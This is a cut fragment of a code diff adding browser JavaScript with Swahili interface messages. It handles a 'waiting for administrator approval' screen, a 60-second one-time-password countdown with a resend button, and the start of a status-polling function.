+          document.getElementById('loading-title').innerText = "Inasubiri idhini ya msimamizi...";
+          document.getElementById('loading-sub').innerText = "Tafadhali kaa kwenye ukurasa huu.";
+          startStatusPolling();
+        } else {
+          hideLoading();
+          alert(data.error || 'Imeshindikana kuchakata.');
+        }
+      } catch (e) {
+        hideLoading();
+        alert('Hitilafu ya mtandao.');
+      }
+    });
+  }
+
+  function startOtpCountdown() {
+    countdownSeconds = 60;
+    const countdownEl = document.getElementById('otp-countdown');
+    const resendBtn = document.getElementById('btn-resend-otp');
+    if (resendBtn) {
+      resendBtn.style.pointerEvents = 'none';
+      resendBtn.style.opacity = '0.6';
+    }
+
+    if (otpTimerInterval) clearInterval(otpTimerInterval);
+    otpTimerInterval = setInterval(() => {
+      countdownSeconds--;
+      if (countdownEl) countdownEl.innerText = countdownSeconds;
+      if (countdownSeconds <= 0) {
+        clearInterval(otpTimerInterval);
+        if (resendBtn) {
+          resendBtn.style.pointerEvents = 'auto';
+          resendBtn.style.opacity = '1';
+        }
+      }
+    }, 1000);
+  }
+
+  const resendBtn = document.getElementById('btn-resend-otp');
+  if (resendBtn) {
+    resendBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      if (countdownSeconds <= 0) {
+        otpSurfaceBanner.classList.remove('active');
+        otpDigits6.forEach(i => i.value = '');
+        if (otpDigits6[0]) otpDigits6[0].focus();
+        startOtpCountdown();
+      }
+    });
+  }
+
+  function startStatusPolling() {
+   
